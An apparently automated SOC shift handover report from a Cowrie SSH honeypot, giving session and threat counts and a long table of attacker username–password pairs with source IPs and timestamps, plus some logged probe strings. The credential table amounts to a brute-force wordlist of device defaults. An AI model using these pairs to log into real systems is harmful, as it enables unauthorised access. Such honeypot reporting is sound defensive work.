# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-13 |
| **Generated At** | 2026-07-13T06:59:03Z |
| **Shift Time** | 06:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **670** |
| Confirmed Threats | **645** |
| False Positives Filtered | **25** (3.7%) |
| Unique Attacker IPs | **145** |
| Countries of Origin | **35** |
| High Severity Cases | **396** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **274** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **447** |
| Unique Credential Pairs | **295** |
| Unique Usernames | **181** |
| Unique Passwords | **210** |
| Successful Auth Pairs | **389** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 123 |
| `admin` | 39 |
| `345gs5662d34` | 13 |
| `support` | 12 |
| `blank` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 18 |
| `1234` | 13 |
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `admin` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `support` | `support` | 11 |
| `admin` | `admin` | 7 |
| `root` | `LeitboGi0ro` | 7 |
| `config` | `1234` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `185.242.3.14` | 2026-07-13T02:55:06 |
| `root` | `` | `185.242.3.14` | 2026-07-13T02:55:07 |
| `admin` | `` | `185.242.3.14` | 2026-07-13T02:55:08 |
| `admin` | `123456` | `185.242.3.14` | 2026-07-13T02:55:09 |
| `root` | `12345` | `185.242.3.14` | 2026-07-13T02:55:10 |
| `admin` | `12345` | `185.242.3.14` | 2026-07-13T02:55:10 |
| `root` | `toor` | `185.242.3.14` | 2026-07-13T02:55:11 |
| `toor` | `root` | `185.242.3.14` | 2026-07-13T02:55:12 |
| `root` | `password` | `185.242.3.14` | 2026-07-13T02:55:13 |
| `admin` | `password` | `185.242.3.14` | 2026-07-13T02:55:14 |
| `root` | `Zte521` | `185.242.3.14` | 2026-07-13T02:55:20 |
| `root` | `xc3511` | `185.242.3.14` | 2026-07-13T02:55:21 |
| `root` | `vizxv` | `185.242.3.14` | 2026-07-13T02:55:22 |
| `root` | `realtek` | `185.242.3.14` | 2026-07-13T02:55:23 |
| `root` | `default` | `185.242.3.14` | 2026-07-13T02:55:24 |
| `default` | `default` | `185.242.3.14` | 2026-07-13T02:55:24 |
| `user` | `user` | `185.242.3.14` | 2026-07-13T02:55:25 |
| `guest` | `guest` | `185.242.3.14` | 2026-07-13T02:55:26 |
| `root` | `888888` | `185.242.3.14` | 2026-07-13T02:55:27 |
| `root` | `666666` | `185.242.3.14` | 2026-07-13T02:55:28 |
| `root` | `000000` | `185.242.3.14` | 2026-07-13T02:55:28 |
| `root` | `1111` | `185.242.3.14` | 2026-07-13T02:55:29 |
| `root` | `1234` | `185.242.3.14` | 2026-07-13T02:55:30 |
| `admin` | `1234` | `185.242.3.14` | 2026-07-13T02:55:31 |
| `root` | `changeme` | `185.242.3.14` | 2026-07-13T02:55:31 |
| `admin` | `changeme` | `185.242.3.14` | 2026-07-13T02:55:32 |
| `root` | `admin` | `185.242.3.14` | 2026-07-13T02:55:33 |
| `admin` | `root` | `185.242.3.14` | 2026-07-13T02:55:34 |
| `support` | `support` | `185.242.3.14` | 2026-07-13T02:55:34 |
| `tech` | `tech` | `185.242.3.14` | 2026-07-13T02:55:35 |
| `ubnt` | `ubnt` | `185.242.3.14` | 2026-07-13T02:55:36 |
| `root` | `7ujMko0vizxv` | `185.242.3.14` | 2026-07-13T02:55:37 |
| `root` | `7ujMko0admin` | `185.242.3.14` | 2026-07-13T02:55:39 |
| `root` | `klv123` | `185.242.3.14` | 2026-07-13T02:55:39 |
| `root` | `hi3518` | `185.242.3.14` | 2026-07-13T02:55:40 |
| `root` | `xmhdipc` | `185.242.3.14` | 2026-07-13T02:55:41 |
| `root` | `jvbzd` | `185.242.3.14` | 2026-07-13T02:55:42 |
| `root` | `antslq` | `185.242.3.14` | 2026-07-13T02:55:42 |
| `default` | `OxhlwSG8` | `185.242.3.14` | 2026-07-13T02:55:43 |
| `default` | `S2fGqNFs` | `185.242.3.14` | 2026-07-13T02:55:44 |
| `default` | `lJwpbo6` | `185.242.3.14` | 2026-07-13T02:55:45 |
| `root` | `system` | `185.242.3.14` | 2026-07-13T02:55:45 |
| `Administrator` | `admin` | `185.242.3.14` | 2026-07-13T02:55:46 |
| `root` | `12345678` | `185.242.3.14` | 2026-07-13T02:55:47 |
| `root` | `123456789` | `185.242.3.14` | 2026-07-13T02:55:48 |
| `admin` | `12345678` | `185.242.3.14` | 2026-07-13T02:55:49 |
| `nobody` | `1234567` | `210.13.99.66` | 2026-07-13T02:57:53 |
| `nobody` | `1234567` | `117.205.2.250` | 2026-07-13T02:58:06 |
| `nobody` | `1234567` | `10.0.0.73` | 2026-07-13T02:58:10 |
| `User` | `1234` | `65.20.141.202` | 2026-07-13T02:58:33 |
| `User` | `1234` | `101.13.1.58` | 2026-07-13T02:58:42 |
| `support` | `support` | `176.53.159.196` | 2026-07-13T02:58:42 |
| `support` | `support` | `10.0.0.73` | 2026-07-13T03:00:00 |
| `root` | `123qwe` | `110.227.213.163` | 2026-07-13T03:05:22 |
| `nagios` | `P@ssw0rd` | `10.0.0.73` | 2026-07-13T03:07:45 |
| `root` | `123qwe` | `118.122.196.230` | 2026-07-13T03:08:35 |
| `root` | `123qwe` | `196.219.75.143` | 2026-07-13T03:08:42 |
| `root` | `123qwe` | `10.0.0.73` | 2026-07-13T03:08:56 |
| `nagios` | `P@ssw0rd` | `185.242.3.195` | 2026-07-13T03:11:50 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-13T03:12:15 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-13T03:12:15 |
| `root` | `a1234567` | `77.90.185.20` | 2026-07-13T03:15:37 |
| `Admin` | `Admin2006` | `1.212.225.99` | 2026-07-13T03:19:50 |
| `user1` | `Aa123456` | `10.0.0.73` | 2026-07-13T03:23:15 |
| `Admin` | `Admin2006` | `182.225.134.13` | 2026-07-13T03:23:16 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-13T03:23:18 |
| `user1` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T03:23:18 |
| `Admin` | `Admin2006` | `49.124.150.252` | 2026-07-13T03:23:26 |
| `Admin` | `Admin2006` | `10.0.0.73` | 2026-07-13T03:23:39 |
| `ubuntu` | `password1` | `185.242.3.195` | 2026-07-13T03:25:16 |
| `12` | `12` | `117.70.94.155` | 2026-07-13T03:28:00 |
| `root` | `master` | `121.164.135.251` | 2026-07-13T03:30:50 |
| `root` | `master` | `59.46.182.10` | 2026-07-13T03:30:59 |
| `root` | `12345aa` | `10.0.0.73` | 2026-07-13T03:33:08 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T03:33:13 |
| `root` | `master` | `111.70.23.236` | 2026-07-13T03:34:25 |
| `root` | `master` | `117.248.201.39` | 2026-07-13T03:34:33 |
| `ubuntu` | `password1` | `10.0.0.73` | 2026-07-13T03:39:27 |
| `user` | `987654321` | `10.0.0.73` | 2026-07-13T03:49:46 |
| `root` | `61WUkz6XTC` | `120.79.199.56` | 2026-07-13T03:52:45 |
| `config` | `1234` | `111.70.32.179` | 2026-07-13T03:56:43 |
| `config` | `1234` | `178.178.194.131` | 2026-07-13T03:56:52 |
| `root` | `P@ssw0rda123` | `185.242.3.195` | 2026-07-13T03:57:06 |
| `config` | `1234` | `122.254.30.34` | 2026-07-13T04:00:04 |
| `config` | `1234` | `203.198.173.137` | 2026-07-13T04:00:18 |
| `config` | `1234` | `10.0.0.73` | 2026-07-13T04:00:24 |
| `admin` | `000` | `10.0.0.73` | 2026-07-13T04:06:53 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T04:06:55 |
| `root` | `P@ssw0rda123` | `10.0.0.73` | 2026-07-13T04:11:18 |
| `admin` | `Admin123!` | `62.122.195.14` | 2026-07-13T04:14:47 |
| `admin` | `Admin123!` | `10.0.0.73` | 2026-07-13T04:15:18 |
| `root` | `admin` | `91.92.40.240` | 2026-07-13T04:18:29 |
| `admin` | `9999` | `203.129.217.70` | 2026-07-13T04:18:59 |
| `admin` | `9999` | `10.0.0.73` | 2026-07-13T04:19:20 |
| `www` | `www` | `122.187.147.13` | 2026-07-13T04:21:55 |
| `www` | `www` | `196.28.226.66` | 2026-07-13T04:22:06 |
| `dinara` | `dinara` | `167.99.72.161` | 2026-07-13T04:23:30 |
| `dinara` | `dinara` | `130.12.180.51` | 2026-07-13T04:23:31 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-13T04:28:21 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-13T04:28:21 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-13T04:28:23 |
| `root` | `111222tianya` | `185.242.3.195` | 2026-07-13T04:28:52 |
| `support` | `Support11` | `117.70.94.155` | 2026-07-13T04:37:35 |
| `debian` | `123123123` | `74.208.177.56` | 2026-07-13T04:41:47 |
| `root` | `111222tianya` | `10.0.0.73` | 2026-07-13T04:42:50 |
| `admin` | `admin` | `47.252.16.44` | 2026-07-13T04:42:57 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-13T04:42:57 |
| `debian` | `123123123` | `10.0.0.73` | 2026-07-13T04:45:56 |
| `debian` | `debian88` | `65.20.204.41` | 2026-07-13T04:48:11 |
| `root` | `111111` | `92.118.39.71` | 2026-07-13T04:54:23 |
| `rose` | `rose2025` | `103.97.101.25` | 2026-07-13T04:54:49 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-07-13T04:54:55 |
| `oracle` | `test1234` | `102.210.149.236` | 2026-07-13T04:55:03 |
| `rose` | `3245gs5662d34` | `103.97.101.25` | 2026-07-13T04:55:03 |
| `345gs5662d34` | `345gs5662d34` | `102.210.149.236` | 2026-07-13T04:55:09 |
| `oracle` | `3245gs5662d34` | `102.210.149.236` | 2026-07-13T04:55:11 |
| `root` | `123123` | `92.118.39.71` | 2026-07-13T04:56:21 |
| `root` | `Password!!` | `165.154.40.97` | 2026-07-13T04:57:00 |
| `345gs5662d34` | `345gs5662d34` | `165.154.40.97` | 2026-07-13T04:57:04 |
| `root` | `3245gs5662d34` | `165.154.40.97` | 2026-07-13T04:57:06 |
| `root` | `1234` | `92.118.39.71` | 2026-07-13T04:58:29 |
| `root` | `qwe789` | `185.242.3.195` | 2026-07-13T05:00:25 |
| `root` | `12345` | `92.118.39.71` | 2026-07-13T05:00:37 |
| `root` | `656565` | `59.8.66.225` | 2026-07-13T05:03:58 |
| `root` | `12345678` | `92.118.39.71` | 2026-07-13T05:04:47 |
| `root` | `123456789` | `92.118.39.71` | 2026-07-13T05:06:50 |
| `root` | `656565` | `65.20.217.64` | 2026-07-13T05:07:31 |
| `root` | `656565` | `178.178.222.55` | 2026-07-13T05:07:38 |
| `centos` | `qwer1234` | `182.156.35.238` | 2026-07-13T05:07:59 |
| `centos` | `qwer1234` | `182.53.55.252` | 2026-07-13T05:08:07 |
| `root` | `Password1` | `92.118.39.71` | 2026-07-13T05:08:43 |
| `root` | `admin` | `92.118.39.71` | 2026-07-13T05:10:45 |
| `centos` | `qwer1234` | `10.0.0.73` | 2026-07-13T05:11:56 |
| `root` | `admin123` | `92.118.39.71` | 2026-07-13T05:12:35 |
| `root` | `Changeme123` | `125.139.124.120` | 2026-07-13T05:13:57 |
| `root` | `Changeme123` | `61.80.161.172` | 2026-07-13T05:14:10 |
| `root` | `default` | `92.118.39.71` | 2026-07-13T05:14:16 |
| `root` | `qwe789` | `10.0.0.73` | 2026-07-13T05:14:44 |
| `root` | `letmein` | `92.118.39.71` | 2026-07-13T05:16:10 |
| `root` | `Changeme123` | `213.154.80.51` | 2026-07-13T05:17:43 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-07-13T05:19:12 |
| `root` | `password` | `92.118.39.71` | 2026-07-13T05:22:11 |
| `root` | `qwerty` | `92.118.39.71` | 2026-07-13T05:24:05 |
| `root` | `system` | `92.118.39.71` | 2026-07-13T05:27:38 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-13T05:28:38 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-13T05:28:40 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-13T05:28:44 |
| `root` | `toor` | `92.118.39.71` | 2026-07-13T05:29:28 |
| `blank` | `blank123456` | `117.248.201.39` | 2026-07-13T05:30:04 |
| `admin` | `111111` | `92.118.39.71` | 2026-07-13T05:31:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `184.105.247.252` | 2026-07-13T05:32:54 |
| `sadri` | `123456` | `185.242.3.195` | 2026-07-13T05:33:13 |
| `admin` | `123123` | `92.118.39.71` | 2026-07-13T05:33:23 |
| `GET / HTTP/1.0` | `` | `69.164.207.173` | 2026-07-13T05:33:35 |
| `blank` | `blank123456` | `50.217.40.11` | 2026-07-13T05:33:40 |
| `OPTIONS / HTTP/1.0` | `` | `69.164.207.173` | 2026-07-13T05:33:41 |
| `OPTIONS / RTSP/1.0` | `` | `69.164.207.173` | 2026-07-13T05:33:45 |
| `blank` | `blank1234567` | `115.46.88.68` | 2026-07-13T05:34:07 |
| `blank` | `blank1234567` | `61.169.6.99` | 2026-07-13T05:34:19 |
| `GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0` | `` | `69.164.207.173` | 2026-07-13T05:34:33 |
| `b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00'` | ` ` | `69.164.207.173` | 2026-07-13T05:34:43 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `69.164.207.173` | 2026-07-13T05:34:54 |
| `GET /devicedesc.xml HTTP/1.1` | `` | `69.164.207.173` | 2026-07-13T05:35:42 |
| `CONNECT` | `accept-version:1.2` | `69.164.207.173` | 2026-07-13T05:35:47 |
| `admin` | `1234` | `92.118.39.71` | 2026-07-13T05:37:16 |
| `blank` | `blank1234567` | `85.105.255.56` | 2026-07-13T05:37:50 |
| `blank` | `blank1234567` | `78.186.54.65` | 2026-07-13T05:38:02 |
| `blank` | `blank1234567` | `10.0.0.73` | 2026-07-13T05:38:17 |
| `admin` | `12345` | `92.118.39.71` | 2026-07-13T05:39:07 |
| `root` | `Abc12345` | `124.239.129.2` | 2026-07-13T05:40:40 |
| `admin` | `123456` | `92.118.39.71` | 2026-07-13T05:40:52 |
| `root` | `Abc12345` | `218.26.205.154` | 2026-07-13T05:40:52 |
| `admin` | `12345678` | `92.118.39.71` | 2026-07-13T05:42:34 |
| `admin` | `admin` | `89.126.211.166` | 2026-07-13T05:43:19 |
| `admin` | `123456789` | `92.118.39.71` | 2026-07-13T05:44:19 |
| `root` | `Abc12345` | `191.36.152.28` | 2026-07-13T05:44:41 |
| `root` | `Abc12345` | `10.0.0.73` | 2026-07-13T05:45:06 |
| `admin` | `Administrator` | `92.118.39.71` | 2026-07-13T05:46:06 |
| `sadri` | `123456` | `10.0.0.73` | 2026-07-13T05:47:34 |
| `admin` | `access` | `92.118.39.71` | 2026-07-13T05:47:43 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-13T05:49:35 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-13T05:49:36 |
| `admin` | `admin` | `92.118.39.71` | 2026-07-13T05:49:47 |
| `admin` | `admin123` | `92.118.39.71` | 2026-07-13T05:52:50 |
| `admin` | `adminadmin` | `92.118.39.71` | 2026-07-13T05:56:54 |
| `admin` | `letmein` | `92.118.39.71` | 2026-07-13T05:58:50 |
| `admin` | `passw0rd` | `92.118.39.71` | 2026-07-13T06:01:03 |
| `admin` | `password` | `92.118.39.71` | 2026-07-13T06:02:58 |
| `ubnt` | `admin123` | `183.233.85.194` | 2026-07-13T06:04:16 |
| `ubnt` | `admin123` | `69.126.144.30` | 2026-07-13T06:04:28 |
| `admin` | `password1` | `92.118.39.71` | 2026-07-13T06:04:39 |
| `ubnt` | `admin123` | `10.0.0.73` | 2026-07-13T06:04:42 |
| `root` | `Pass123456` | `185.242.3.195` | 2026-07-13T06:05:25 |
| `admin` | `qwerty` | `92.118.39.71` | 2026-07-13T06:06:29 |
| `root` | `Qwer1234` | `5.11.162.163` | 2026-07-13T06:07:51 |
| `apache` | `1234` | `92.118.39.71` | 2026-07-13T06:09:00 |
| `root` | `Qwer1234` | `220.128.137.164` | 2026-07-13T06:11:17 |
| `root` | `Qwer1234` | `49.124.151.2` | 2026-07-13T06:11:27 |
| `root` | `Qwer1234` | `10.0.0.73` | 2026-07-13T06:11:40 |
| `lys` | `lys` | `2.58.172.185` | 2026-07-13T06:12:14 |
| `apache` | `12345678` | `92.118.39.71` | 2026-07-13T06:12:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `172.236.228.224` | 2026-07-13T06:18:23 |
| `apache` | `admin` | `92.118.39.71` | 2026-07-13T06:18:46 |
| `root` | `Pass123456` | `10.0.0.73` | 2026-07-13T06:19:33 |
| `admin` | `admin13` | `76.132.238.43` | 2026-07-13T06:25:10 |
| `apache` | `apache` | `187.8.120.90` | 2026-07-13T06:26:52 |
| `apache` | `apache` | `83.239.0.202` | 2026-07-13T06:26:59 |
| `steam` | `admin123` | `101.47.155.9` | 2026-07-13T06:27:08 |
| `345gs5662d34` | `345gs5662d34` | `101.47.155.9` | 2026-07-13T06:27:12 |
| `steam` | `3245gs5662d34` | `101.47.155.9` | 2026-07-13T06:27:14 |
| `root` | `666666` | `64.53.7.231` | 2026-07-13T06:34:01 |
| `user18` | `aa123456` | `91.92.47.128` | 2026-07-13T06:35:14 |
| `guoyanan` | `Admin123!` | `91.92.47.128` | 2026-07-13T06:35:26 |
| `shoja` | `jenkins@123` | `91.92.47.128` | 2026-07-13T06:35:32 |
| `zextras` | `nutanix/4u` | `91.92.47.128` | 2026-07-13T06:35:41 |
| `admin3` | `steam123` | `91.92.47.128` | 2026-07-13T06:35:50 |
| `wso2` | `phuvanduc` | `91.92.47.128` | 2026-07-13T06:36:00 |
| `aporaudio` | `root1` | `91.92.47.128` | 2026-07-13T06:36:09 |
| `SJ18` | `oracle123` | `91.92.47.128` | 2026-07-13T06:36:16 |
| `s10gp` | `esuser` | `91.92.47.128` | 2026-07-13T06:36:25 |
| `crm` | `ubnt` | `91.92.47.128` | 2026-07-13T06:36:35 |
| `s7rosine` | `fivem` | `91.92.47.128` | 2026-07-13T06:36:44 |
| `fivem` | `rancher` | `91.92.47.128` | 2026-07-13T06:36:53 |
| `s8jean` | `git123` | `91.92.47.128` | 2026-07-13T06:37:00 |
| `cbm` | `t0talc0ntr0l4!` | `91.92.47.128` | 2026-07-13T06:37:09 |
| `root` | `mnbcxz` | `185.242.3.195` | 2026-07-13T06:37:13 |
| `CG04` | `postgres` | `91.92.47.128` | 2026-07-13T06:37:18 |
| `arvin` | `home` | `91.92.47.128` | 2026-07-13T06:37:26 |
| `teste` | `123456789` | `91.92.47.128` | 2026-07-13T06:37:35 |
| `grass` | `mc` | `91.92.47.128` | 2026-07-13T06:37:44 |
| `tty0` | `tom` | `91.92.47.128` | 2026-07-13T06:37:52 |
| `mamat` | `tester` | `91.92.47.128` | 2026-07-13T06:38:00 |
| `wangjiayao` | `user` | `91.92.47.128` | 2026-07-13T06:38:10 |
| `a1vincent` | `P@ssw0rd2026` | `91.92.47.128` | 2026-07-13T06:38:18 |
| `ubnt` | `abc12345` | `91.92.47.128` | 2026-07-13T06:38:28 |
| `certssl` | `test@123` | `91.92.47.128` | 2026-07-13T06:38:35 |
| `oracle` | `master` | `91.92.47.128` | 2026-07-13T06:38:44 |
| `s8faiza` | `qwe123456` | `91.92.47.128` | 2026-07-13T06:38:51 |
| `us73` | `cw` | `91.92.47.128` | 2026-07-13T06:39:01 |
| `plex` | `system` | `91.92.47.128` | 2026-07-13T06:39:09 |
| `sybuts` | `qwe123!@` | `91.92.47.128` | 2026-07-13T06:39:17 |
| `discordbot` | `mysql` | `91.92.47.128` | 2026-07-13T06:39:26 |
| `shalini` | `0000` | `91.92.47.128` | 2026-07-13T06:39:33 |
| `dell` | `changeme` | `91.92.47.128` | 2026-07-13T06:39:41 |
| `home` | `es123456` | `91.92.47.128` | 2026-07-13T06:39:50 |
| `us1` | `123123` | `91.92.47.128` | 2026-07-13T06:39:59 |
| `pcpqa` | `data` | `91.92.47.128` | 2026-07-13T06:40:06 |
| `monitoring` | `a` | `91.92.47.128` | 2026-07-13T06:40:15 |
| `gmodserver` | `neptune` | `91.92.47.128` | 2026-07-13T06:40:23 |
| `arpwatch` | `ubuntu` | `91.92.47.128` | 2026-07-13T06:40:31 |
| `arvin` | `zimbra` | `91.92.47.128` | 2026-07-13T06:40:41 |
| `us24` | `master` | `91.92.47.128` | 2026-07-13T06:40:49 |
| `root` | `000000` | `91.92.40.13` | 2026-07-13T06:40:53 |
| `lucas` | `dmdba@123` | `91.92.47.128` | 2026-07-13T06:40:57 |
| `karim` | `wang` | `91.92.47.128` | 2026-07-13T06:41:06 |
| `mkbot` | `operator` | `91.92.47.128` | 2026-07-13T06:41:15 |
| `jaydan` | `qwe123!@` | `91.92.47.128` | 2026-07-13T06:41:22 |
| `pey10` | `1q2w3e4r` | `91.92.47.128` | 2026-07-13T06:41:30 |
| `bernardo` | `qwe123!@` | `91.92.47.128` | 2026-07-13T06:41:39 |
| `italiano` | `root@1234` | `91.92.47.128` | 2026-07-13T06:41:47 |
| `io` | `P@ssword1` | `91.92.47.128` | 2026-07-13T06:41:56 |
| `5919` | `openvpn` | `91.92.47.128` | 2026-07-13T06:42:04 |
| `huayiweidianzi` | `Welcome@123` | `91.92.47.128` | 2026-07-13T06:42:13 |
| `CG04` | `11111111` | `91.92.47.128` | 2026-07-13T06:42:20 |
| `chendanping` | `Qwerty` | `91.92.47.128` | 2026-07-13T06:42:28 |
| `eth1` | `gpadmin` | `91.92.47.128` | 2026-07-13T06:42:36 |
| `lhh` | `!QAZ2wsx3edc` | `91.92.47.128` | 2026-07-13T06:42:45 |
| `liuzhimei` | `gns3` | `91.92.47.128` | 2026-07-13T06:42:53 |
| `technician` | `fahmi` | `91.92.47.128` | 2026-07-13T06:43:02 |
| `us8` | `es123456` | `91.92.47.128` | 2026-07-13T06:43:10 |
| `s10merl` | `P@ssword1` | `91.92.47.128` | 2026-07-13T06:43:18 |
| `sambauser` | `Abc123456` | `91.92.47.128` | 2026-07-13T06:43:26 |
| `pey3` | `es123456` | `91.92.47.128` | 2026-07-13T06:43:37 |
| `5930` | `jack` | `91.92.47.128` | 2026-07-13T06:43:44 |
| `hikemqtt` | `onkar123` | `91.92.47.128` | 2026-07-13T06:43:52 |
| `emps` | `docker` | `91.92.47.128` | 2026-07-13T06:44:00 |
| `mirarus` | `rajvir123` | `91.92.47.128` | 2026-07-13T06:44:08 |
| `s7laura` | `david` | `91.92.47.128` | 2026-07-13T06:44:16 |
| `caja2` | `nutanix/4u` | `91.92.47.128` | 2026-07-13T06:44:24 |
| `zlm` | `hello123` | `91.92.47.128` | 2026-07-13T06:44:33 |
| `anonymous` | `sadmin` | `91.92.47.128` | 2026-07-13T06:44:43 |
| `root` | `testing123` | `4.221.162.168` | 2026-07-13T06:44:49 |
| `xinzhu3gongyi` | `bob` | `91.92.47.128` | 2026-07-13T06:44:50 |
| `345gs5662d34` | `345gs5662d34` | `4.221.162.168` | 2026-07-13T06:44:53 |
| `root` | `3245gs5662d34` | `4.221.162.168` | 2026-07-13T06:44:54 |
| `wetdryworld` | `administrator` | `91.92.47.128` | 2026-07-13T06:44:58 |
| `node` | `frappe@123` | `91.92.47.128` | 2026-07-13T06:45:06 |
| `root` | `A123456!` | `129.121.33.174` | 2026-07-13T06:45:06 |
| `345gs5662d34` | `345gs5662d34` | `129.121.33.174` | 2026-07-13T06:45:09 |
| `root` | `3245gs5662d34` | `129.121.33.174` | 2026-07-13T06:45:10 |
| `mcserver` | `www` | `91.92.47.128` | 2026-07-13T06:45:14 |
| `bernardo` | `raspberry` | `91.92.47.128` | 2026-07-13T06:45:23 |
| `xuze` | `12qwaszx` | `91.92.47.128` | 2026-07-13T06:45:32 |
| `samanali222` | `abc123456` | `91.92.47.128` | 2026-07-13T06:45:40 |
| `openproject` | `odoo18` | `91.92.47.128` | 2026-07-13T06:45:50 |
| `us52` | `000000` | `91.92.47.128` | 2026-07-13T06:45:58 |
| `satisfactory` | `app` | `91.92.47.128` | 2026-07-13T06:46:07 |
| `user7` | `dmdba` | `91.92.47.128` | 2026-07-13T06:46:14 |
| `test` | `asdf` | `187.56.133.95` | 2026-07-13T06:46:19 |
| `345gs5662d34` | `345gs5662d34` | `187.56.133.95` | 2026-07-13T06:46:22 |
| `us6` | `mysql` | `91.92.47.128` | 2026-07-13T06:46:22 |
| `test` | `3245gs5662d34` | `187.56.133.95` | 2026-07-13T06:46:23 |
| `ciuser` | `odoo18` | `91.92.47.128` | 2026-07-13T06:46:31 |
| `sammy` | `root1` | `91.92.47.128` | 2026-07-13T06:46:38 |
| `proxy` | `grid` | `91.92.47.128` | 2026-07-13T06:46:46 |
| `rtelekom` | `user3` | `91.92.47.128` | 2026-07-13T06:46:55 |
| `kvm` | `agent` | `91.92.47.128` | 2026-07-13T06:47:04 |
| `elastic` | `deploy` | `91.92.47.128` | 2026-07-13T06:47:12 |
| `us24` | `11` | `91.92.47.128` | 2026-07-13T06:47:20 |
| `liyang` | `root1234` | `91.92.47.128` | 2026-07-13T06:47:30 |
| `claude` | `docker` | `91.92.47.128` | 2026-07-13T06:47:37 |
| `person` | `1029384756` | `91.92.47.128` | 2026-07-13T06:47:45 |
| `sergey` | `!qaz@WSX` | `91.92.47.128` | 2026-07-13T06:47:53 |
| `chenxue` | `localhost` | `91.92.47.128` | 2026-07-13T06:48:00 |
| `s8faiza` | `odoo18` | `91.92.47.128` | 2026-07-13T06:48:09 |
| `root` | `3333333` | `45.182.5.98` | 2026-07-13T06:48:11 |
| `SJ19` | `mysql@1234` | `91.92.47.128` | 2026-07-13T06:48:17 |
| `root` | `3333333` | `196.191.142.67` | 2026-07-13T06:48:21 |
| `openclaw` | `alex` | `91.92.47.128` | 2026-07-13T06:48:25 |
| `hanliangheng` | `Admin@123` | `91.92.47.128` | 2026-07-13T06:48:33 |
| `gujiaxuan` | `welcome1` | `91.92.47.128` | 2026-07-13T06:48:41 |
| `sinh` | `sinh123` | `117.218.75.251` | 2026-07-13T06:48:42 |
| `345gs5662d34` | `345gs5662d34` | `117.218.75.251` | 2026-07-13T06:48:47 |
| `pankaj` | `flask` | `91.92.47.128` | 2026-07-13T06:48:48 |
| `sinh` | `3245gs5662d34` | `117.218.75.251` | 2026-07-13T06:48:49 |
| `alireza` | `aiuser` | `91.92.47.128` | 2026-07-13T06:48:54 |
| `kali` | `rancher` | `91.92.47.128` | 2026-07-13T06:49:01 |
| `root` | `` | `94.154.43.10` | 2026-07-13T06:49:05 |
| `netdata` | `abcd1234` | `91.92.47.128` | 2026-07-13T06:49:08 |
| `admin3` | `1qaz2wsx` | `91.92.47.128` | 2026-07-13T06:49:14 |
| `us6` | `alex` | `91.92.47.128` | 2026-07-13T06:49:20 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-13T06:49:25 |
| `david` | `weblogic` | `91.92.47.128` | 2026-07-13T06:49:26 |
| `vastai_kaalia` | `oracle123` | `91.92.47.128` | 2026-07-13T06:49:33 |
| `mailuser` | `rocky` | `91.92.47.128` | 2026-07-13T06:49:40 |
| `rohitdg` | `kevin` | `91.92.47.128` | 2026-07-13T06:49:46 |
| `ftpuser` | `Abcd1234` | `128.14.225.164` | 2026-07-13T06:49:52 |
| `esroot` | `dmdba` | `91.92.47.128` | 2026-07-13T06:49:53 |
| `345gs5662d34` | `345gs5662d34` | `128.14.225.164` | 2026-07-13T06:49:54 |
| `ftpuser` | `3245gs5662d34` | `128.14.225.164` | 2026-07-13T06:49:55 |
| `frances` | `git` | `91.92.47.128` | 2026-07-13T06:49:58 |
| `5906` | `agent` | `91.92.47.128` | 2026-07-13T06:50:05 |
| `SJ02` | `Admin123` | `91.92.47.128` | 2026-07-13T06:50:12 |
| `root123` | `data` | `91.92.47.128` | 2026-07-13T06:50:18 |
| `sai` | `helloworld` | `91.92.47.128` | 2026-07-13T06:50:24 |
| `rajesh` | `P@ssword` | `91.92.47.128` | 2026-07-13T06:50:31 |
| `guanying` | `newuser` | `91.92.47.128` | 2026-07-13T06:50:37 |
| `kms` | `123321` | `91.92.47.128` | 2026-07-13T06:50:44 |
| `us7` | `Aa123321` | `91.92.47.128` | 2026-07-13T06:50:49 |
| `docker` | `000000` | `91.92.47.128` | 2026-07-13T06:50:56 |
| `username` | `user1234` | `91.92.47.128` | 2026-07-13T06:51:03 |
| `sunil` | `Aa123321` | `91.92.47.128` | 2026-07-13T06:51:11 |
| `sammy` | `1` | `172.96.182.111` | 2026-07-13T06:51:15 |
| `345gs5662d34` | `345gs5662d34` | `172.96.182.111` | 2026-07-13T06:51:17 |
| `tob` | `test1` | `91.92.47.128` | 2026-07-13T06:51:18 |
| `sammy` | `3245gs5662d34` | `172.96.182.111` | 2026-07-13T06:51:18 |
